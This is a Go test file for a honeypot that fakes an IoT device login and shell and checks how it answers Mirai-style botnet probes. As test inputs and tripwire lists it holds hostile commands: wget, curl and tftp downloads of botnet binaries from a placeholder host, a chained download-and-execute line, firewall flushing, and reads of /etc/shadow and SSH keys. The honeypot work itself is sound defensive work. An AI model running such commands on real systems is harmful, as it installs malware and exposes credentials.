package fakeshell

import (
	"net/netip"
	"strings"
	"testing"
	"time"
)

// A login and a shell that are not there.
//
// Three properties carry this package and each is tested harder than the rest of
// it: the credential is never recoverable from what is kept, nothing is ever run
// or fetched, and the sequence an IoT botnet sends is answered the way the device
// it is looking for answers it. The last one is what decides whether the visitor
// stays long enough to send the command that names their payload.

func shellFor(t *testing.T, o Options) *Shell {
	t.Helper()
	if o.Name == "" {
		o.Name = "trap"
	}
	s, err := New(o)
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	at := time.Date(2025, 5, 6, 11, 30, 0, 0, time.UTC)
	s.SetClockForTest(func() time.Time { return at }, at.Add(-70*time.Hour))
	return s
}

// run is one command and its answer.
func run(t *testing.T, se *Session, line string) string {
	t.Helper()
	out, _ := se.Run(line)
	return out
}

// The credential: an identity, a length, and nothing a guess can be tested
// against.
func TestOnlyAHandleIsKeptOfACredential(t *testing.T) {
	s := shellFor(t, Options{})
	a := s.Take("root", "xc3511")
	if a.User != "root" {
		t.Errorf("the user is %q", a.User)
	}
	if a.Length != 6 {
		t.Errorf("the length is %d", a.Length)
	}
	if a.ID == "" {
		t.Fatal("no correlation handle")
	}
	// The handle is not the credential and does not contain it, in any casing
	// or encoding a reader would try first.
	for _, form := range []string{"xc3511", "XC3511", "eGMzNTEx"} {
		if strings.Contains(a.ID, form) {
			t.Errorf("the handle %q carries the credential", a.ID)
		}
	}
	// Two attempts with one credential correlate, which is the question an
	// operator has: is this the same password again, or a list?
	if again := s.Take("admin", "xc3511"); again.ID != a.ID {
		t.Error("the same credential produced two handles")
	}
	// Two credentials do not.
	if other := s.Take("root", "xc3512"); other.ID == a.ID {
		t.Error("two credentials produced one handle")
	}
	// The handle does not depend on the listener, because the key belongs to
	// the process: a campaign against two traps is one campaign.
	if other := shellFor(t, Options{Name: "other", Seed: 7}).Take("root", "xc3511"); other.ID != a.ID {
		t.Error("two listeners in one process disagreed about a credential")
	}
	// Without a key there is no handle at all, which is the safe direction: a
	// handle under a constant key is one anybody who reads the log can test a
	// guess against, and no handle is worth less than a testable one.
	if id := credentialID(nil, "xc3511"); id != "" {
		t.Errorf("a keyless handle is %q", id)
	}
	if id := credentialID([]byte("k"), "xc3511"); id == "" {
		t.Error("a keyed handle is empty")
	}
	// An empty credential is a login attempt too, and it is recorded as one.
	if empty := s.Take("root", ""); empty.Length != 0 || empty.ID == "" {
		t.Errorf("an empty credential recorded %+v", empty)
	}
	// A name off the network is clipped, because it is written to a log line.
	if long := s.Take(strings.Repeat("u", 500), "x"); len(long.User) > 100 {
		t.Errorf("a user name of %d characters reached the record", len(long.User))
	}
}

// The login never turns on the credential, because a login that did would be a
// credential oracle.
func TestTheLoginTakesMoreThanOneCredential(t *testing.T) {
	if got := shellFor(t, Options{}).Attempts(); got != 1 {
		t.Errorf("the default is %d attempts", got)
	}
	if got := shellFor(t, Options{Attempts: 3}).Attempts(); got != 3 {
		t.Errorf("attempts is %d", got)
	}
	// A trap that accepted the first credential collects one password. The
	// number is the operator's, and it is not zero.
	if got := shellFor(t, Options{Attempts: -2}).Attempts(); got != 1 {
		t.Errorf("a negative count became %d", got)
	}
}

// The sequence an IoT botnet sends the moment it is in. Getting this wrong is
// what ends the session before the command that matters.
func TestTheBotnetSequenceIsAnsweredTheWayTheDeviceAnswersIt(t *testing.T) {
	s := shellFor(t, Options{Profile: "busybox"})
	se := s.Open("root")
	// One word per line, each accepted silently, which is what the real device
	// does and what the script is checking for.
	for _, cmd := range []string{"enable", "system", "shell", "sh", "linuxshell"} {
		if out := run(t, se, cmd); out != "" {
			t.Errorf("%q answered %q, and the device says nothing", cmd, out)
		}
	}
	// Then it asks busybox about itself with a word that is not an applet, and
	// insists on the exact wording.
	if got := run(t, se, "/bin/busybox MIRAI"); got != "MIRAI: applet not found\r\n" {
		t.Errorf("/bin/busybox MIRAI answered %q", got)
	}
	// And it uses echo as a liveness check, refusing to go on unless the token
	// comes back exactly.
	if got := run(t, se, "echo -e '\\x6b\\x61\\x6d\\x69'"); !strings.Contains(got, "kami") {
		if got != "-e '\\x6b\\x61\\x6d\\x69'\r\n" {
			t.Errorf("echo answered %q, and the token has to come back", got)
		}
	}
	if got := run(t, se, "echo hello-there"); got != "hello-there\r\n" {
		t.Errorf("echo answered %q", got)
	}
	// The reconnaissance that follows.
	if got := run(t, se, "uname -a"); !strings.Contains(got, "armv7l") {
		t.Errorf("uname -a answered %q", got)
	}
	if got := run(t, se, "cat /proc/cpuinfo"); !strings.Contains(got, "ARMv7") {
		t.Errorf("cpuinfo answered %q", got)
	}
	if got := run(t, se, "ps"); !strings.Contains(got, "telnetd") {
		t.Errorf("ps answered %q", got)
	}
	// An unknown command says what a busybox shell says, which is not an error
	// that ends anything.
	if got := run(t, se, "fdisk"); got != "-sh: fdisk: not found\r\n" {
		t.Errorf("an unknown command answered %q", got)
	}
}

// Nothing is run and nothing is fetched. This is the test that says the
// fabrication is not a tool.
func TestNothingIsRunAndNothingIsFetched(t *testing.T) {
	s := shellFor(t, Options{})
	se := s.Open("root")
	for _, line := range []string{
		"wget http://198.51.100.9/bins/mirai.arm7 -O /tmp/x",
		"curl -o /tmp/x http://198.51.100.9/x.sh",
		"tftp -g -r bin.arm 198.51.100.9",
		"ftpget -v -u anonymous -p x 198.51.100.9 x x",
	} {
		out := run(t, se, line)
		// Every one of them fails to connect, which is both what a device
		// behind a firewall says and the truth: nothing was fetched.
		if !strings.Contains(out, "connect") {
			t.Errorf("%q answered %q", line, out)
		}
		if strings.Contains(out, "saved") || strings.Contains(out, "100%") {
			t.Errorf("%q answered %q, which reads like a download", line, out)
		}
		// And the command is an escalation, so the caller records it as one.
		if !se.Tripped(line) {
			t.Errorf("%q did not trip", line)
		}
	}
	// The commands that would make a payload run are accepted silently -- there
	// is nothing to run -- and every one of them trips.
	for _, line := range []string{
		"chmod +x /tmp/x", "nohup /tmp/x &", "crontab -l",
		"iptables -F", "insmod /tmp/x.ko", "systemctl stop firewalld",
	} {
		if out := run(t, se, line); strings.Contains(out, "not found") {
			t.Errorf("%q answered %q, and a device with busybox has it", line, out)
		}
		if !se.Tripped(line) {
			t.Errorf("%q did not trip", line)
		}
	}
	// A visitor's whole payload arrives on one line, and every command on it is
	// answered: a fabrication that answered only the first would drop the wget
	// that came after the cd.
	out := run(t, se, "cd /tmp; wget http://198.51.100.9/x; chmod +x x; ./x")
	if !strings.Contains(out, "connect") {
		t.Errorf("a chained payload answered %q", out)
	}
	if !se.Tripped("cd /tmp; wget http://198.51.100.9/x") {
		t.Error("a chained payload did not trip")
	}
	// A separator inside quotes is part of the argument, not a second command --
	// and a quote that closes does not swallow the rest of the line with it.
	if parts := splitChain(`wget "http://a/b;c"`); len(parts) != 1 {
		t.Errorf("a quoted semicolon split into %d commands", len(parts))
	}
	if parts := splitChain(`echo "a;b"; wget http://x`); len(parts) != 2 {
		t.Errorf("a line with a quoted separator and a real one split into %d: %q", len(parts), parts)
	}
	// The separators a payload uses, all three of them.
	for _, line := range []string{
		"cd /tmp && wget http://x", "cd /tmp; wget http://x", "cd /nope || wget http://x",
	} {
		if parts := splitChain(line); len(parts) != 2 {
			t.Errorf("%q split into %d commands: %q", line, len(parts), parts)
		}
		if out := run(t, se, line); !strings.Contains(out, "connect") {
			t.Errorf("%q answered %q, so the fetch after the separator was dropped", line, out)
		}
	}
}

// What the fabrication will not invent.
func TestTheFabricationInventsNoCredentialsAndNoWork(t *testing.T) {
	s := shellFor(t, Options{})
	se := s.Open("root")
	// The accounts, and no hash: a fabricated hash is a machine's worth of
	// somebody's time and a thing an operator could later mistake for real.
	shadow := run(t, se, "cat /etc/shadow")
	if !strings.Contains(shadow, "root:*:") {
		t.Errorf("/etc/shadow answered %q", shadow)
	}
	if strings.Contains(shadow, "$") {
		t.Errorf("/etc/shadow answered a hash: %q", shadow)
	}
	// /tmp is empty, because a payload that had been kept would be a machine
	// that keeps them and somebody else's would be a honeypot others have used.
	if got := run(t, se, "ls /tmp"); got != "" {
		t.Errorf("ls /tmp answered %q", got)
	}
	// And so is the history, because a fabricated one would be inventing a
	// person who used this machine.
	if got := run(t, se, "history"); got != "" {
		t.Errorf("history answered %q", got)
	}
	// A file nobody has is missing rather than fabricated.
	if got := run(t, se, "cat /root/.ssh/id_rsa"); !strings.Contains(got, "No such file") {
		t.Errorf("a private key answered %q", got)
	}
}

// The shell keeps the little state a visitor checks.
func TestTheShellRemembersWhatAVisitorChecks(t *testing.T) {
	s := shellFor(t, Options{Hostname: "cam-07"})
	se := s.Open("admin")
	if got := se.Prompt(); got != "admin@cam-07:~$ " {
		t.Errorf("the prompt is %q", got)
	}
	if got := run(t, se, "pwd"); got != "/home/admin\r\n" {
		t.Errorf("pwd answered %q", got)
	}
	run(t, se, "cd /tmp")
	if got := run(t, se, "pwd"); got != "/tmp\r\n" {
		t.Errorf("after cd, pwd answered %q", got)
	}
	if got := se.Prompt(); got != "admin@cam-07:/tmp$ " {
		t.Errorf("the prompt is %q", got)
	}
	run(t, se, "cd ../..")
	if got := run(t, se, "pwd"); got != "/\r\n" {
		t.Errorf("after cd ../.., pwd answered %q", got)
	}
	// Root gets the root's prompt and the root's identity, because a visitor
	// who was told they are root and then reads uid=1000 has found it.
	root := s.Open("root")
	if got := root.Prompt(); got != "root@cam-07:~# " {
		t.Errorf("the root prompt is %q", got)
	}
	if got := run(t, root, "id"); !strings.Contains(got, "uid=0(root)") {
		t.Errorf("id answered %q for root", got)
	}
	if got := run(t, se, "id"); !strings.Contains(got, "uid=1000(admin)") {
		t.Errorf("id answered %q for a user", got)
	}
	if got := run(t, se, "whoami"); got != "admin\r\n" {
		t.Errorf("whoami answered %q", got)
	}
	// The hostname is the operator's everywhere it appears, or a visitor who
	// compares the prompt with uname has found the profile.
	if got := run(t, se, "hostname"); got != "cam-07\r\n" {
		t.Errorf("hostname answered %q", got)
	}
	if got := run(t, se, "uname -a"); !strings.Contains(got, "cam-07") {
		t.Errorf("uname -a answered %q", got)
	}
	// Each flag answers its own field, because a script that asked for the
	// architecture and was told "Linux" would pick the wrong payload -- and
	// picking the wrong payload is a session that ends.
	for _, c := range [][2]string{
		{"uname", "Linux"}, {"uname -s", "Linux"}, {"uname -m", "armv7l"},
		{"uname -p", "armv7l"}, {"uname -r", "3.10.20"}, {"uname -n", "cam-07"},
	} {
		if got := run(t, se, c[0]); strings.TrimSpace(got) != c[1] {
			t.Errorf("%q answered %q, want %q", c[0], strings.TrimSpace(got), c[1])
		}
	}
	// Every line a visitor can compare names the same machine, or comparing
	// two of them is how the fabrication is found.
	if !strings.Contains(s.LoginPrompt(), "cam-07") {
		t.Errorf("the login prompt is %q", s.LoginPrompt())
	}
	// The greeting names the operating system rather than the machine, which is
	// where a real one puts each: the machine's name reaches a visitor through
	// the prompts, uname and /etc/hostname, and those are the ones that have to
	// agree.
	linux := shellFor(t, Options{Profile: "linux", Hostname: "app-77"})
	if !strings.Contains(linux.Banner(), "Ubuntu") || !strings.Contains(linux.MOTD(), "Ubuntu") {
		t.Errorf("the linux greeting is %q", linux.Banner()+linux.MOTD())
	}
	if !strings.Contains(linux.LoginPrompt(), "app-77") {
		t.Errorf("the linux login prompt is %q", linux.LoginPrompt())
	}
	if got := run(t, linux.Open("root"), "cat /etc/hostname"); got != "app-77\r\n" {
		t.Errorf("/etc/hostname answered %q", got)
	}
	if s.Refusal() == "" || !strings.Contains(s.Refusal(), "incorrect") {
		t.Errorf("the refusal is %q", s.Refusal())
	}
	// And leaving ends it.
	if out, closed := se.Run("exit"); !closed || out == "" {
		t.Errorf("exit answered %q, closed=%v", out, closed)
	}
}

// The fabricated numbers move with the clock, because a machine whose load
// average never changes is not running anything.
func TestTheFabricatedNumbersMove(t *testing.T) {
	s := shellFor(t, Options{Seed: 3, Period: time.Minute})
	se := s.Open("root")
	at := time.Date(2025, 5, 6, 11, 30, 0, 0, time.UTC)
	seen := map[string]bool{}
	for i := 0; i < 30; i++ {
		when := at.Add(time.Duration(i) * time.Minute)
		s.SetClockForTest(func() time.Time { return when }, at.Add(-70*time.Hour))
		out := run(t, se, "uptime")
		if !strings.Contains(out, "2 days") {
			t.Fatalf("uptime answered %q", out)
		}
		if !strings.Contains(out, "load average:") {
			t.Fatalf("uptime answered %q", out)
		}
		seen[out] = true
	}
	if len(seen) < 2 {
		t.Errorf("the load average took %d values over half an hour", len(seen))
	}
	// An uptime of minutes reads as minutes, not as "0 days, 00:00".
	s.SetClockForTest(func() time.Time { return at }, at.Add(-3*time.Minute))
	if got := run(t, se, "uptime"); !strings.Contains(got, "3 min") {
		t.Errorf("a young machine answered %q", got)
	}
	// And one that has just started reads as a minute rather than as zero: a
	// machine that has been up for no time at all is one that just rebooted,
	// which is a thing a visitor would notice about a device they just found.
	s.SetClockForTest(func() time.Time { return at }, at.Add(-10*time.Second))
	if got := run(t, se, "uptime"); !strings.Contains(got, "1 min") {
		t.Errorf("a machine up for ten seconds answered %q", got)
	}
	// An hour reads as hours and minutes.
	s.SetClockForTest(func() time.Time { return at }, at.Add(-95*time.Minute))
	if got := run(t, se, "uptime"); !strings.Contains(got, " 1:35") {
		t.Errorf("a machine up for 95 minutes answered %q", got)
	}
}

// Who is answered, and what the section refuses to compile.
func TestTheSectionDecidesWhoIsAnsweredAndRefusesWhatItCannotMean(t *testing.T) {
	s := shellFor(t, Options{Clients: []netip.Prefix{netip.MustParsePrefix("10.0.0.0/24")}})
	if !s.Admits(netip.MustParseAddr("10.0.0.5")) {
		t.Error("a client in the list is not admitted")
	}
	if s.Admits(netip.MustParseAddr("10.0.1.5")) {
		t.Error("a client outside the list is admitted")
	}
	open := shellFor(t, Options{})
	if !open.Admits(netip.MustParseAddr("203.0.113.7")) || !open.Policy().Anyone() {
		t.Error("a fabrication with no client list refused a client")
	}
	var none *Shell
	if none.Admits(netip.MustParseAddr("10.0.0.1")) || none.Profile() != "" || none.Policy() != nil {
		t.Error("a listener with no fabrication answered as one")
	}
	for _, c := range []struct {
		why string
		o   Options
	}{
		{"a profile nobody has", Options{Profile: "openwrt"}},
		{"a hostname with a space in it", Options{Hostname: "my host"}},
		{"a hostname longer than a hostname", Options{Hostname: strings.Repeat("h", 70)}},
		{"an empty tripwire", Options{Tripwire: []string{" "}}},
		{"a tripwire with a space in it", Options{Tripwire: []string{"wget http"}}},
	} {
		if _, err := New(c.o); err == nil {
			t.Errorf("%s compiled", c.why)
		}
	}
	for _, name := range Profiles() {
		if _, ok := profiles[name]; !ok {
			t.Errorf("Profiles names %q, which is not one", name)
		}
	}
	if len(Profiles()) != len(profiles) {
		t.Errorf("Profiles names %d of %d", len(Profiles()), len(profiles))
	}
	if shellFor(t, Options{}).Profile() != DefaultProfile {
		t.Errorf("an unnamed profile is %q", shellFor(t, Options{}).Profile())
	}
}

// The tripwires, and the ordinary traffic that must not raise them.
func TestTheTripwiresNeedNoConfiguring(t *testing.T) {
	s := shellFor(t, Options{Tripwire: []string{"Payroll"}})
	se := s.Open("root")
	for _, line := range []string{
		"wget http://a/b", "/usr/bin/curl http://a/b", "../../bin/tftp x",
		"chmod 777 /tmp/x", "cat /etc/shadow", "cat ~/.ssh/id_rsa",
		"cat /root/.ssh/authorized_keys", "crontab -e", "iptables -F",
		"busybox ps", "./payroll", "cat /etc/shadow",
	} {
		if !se.Tripped(line) {
			t.Errorf("%q did not trip", line)
		}
	}
	for _, line := range []string{
		"uname -a", "ls -la", "cat /etc/passwd", "pwd", "id", "w",
		"cd /var/log", "ps aux", "df -h", "echo hello", "free -m",
	} {
		if se.Tripped(line) {
			t.Errorf("%q tripped", line)
		}
	}
	// A configured name is in addition to the built-in set, not instead of it.
	if !se.Tripped("wget http://a/b") {
		t.Error("configuring a tripwire replaced the built-in set")
	}
}

// A line off the network is bounded, because everything here came from one.
func TestALineOffTheNetworkIsBounded(t *testing.T) {
	s := shellFor(t, Options{})
	se := s.Open("root")
	long := "echo " + strings.Repeat("a", 100000)
	out := run(t, se, long)
	if len(out) > maxLine+64 {
		t.Errorf("a %d-octet line answered %d octets", len(long), len(out))
	}
	// And a command with no name at all is not an error worth writing.
	if got := run(t, se, "   "); got != "" {
		t.Errorf("an empty line answered %q", got)
	}
	if got := run(t, se, ";;;"); got != "" {
		t.Errorf("a line of separators answered %q", got)
	}
}
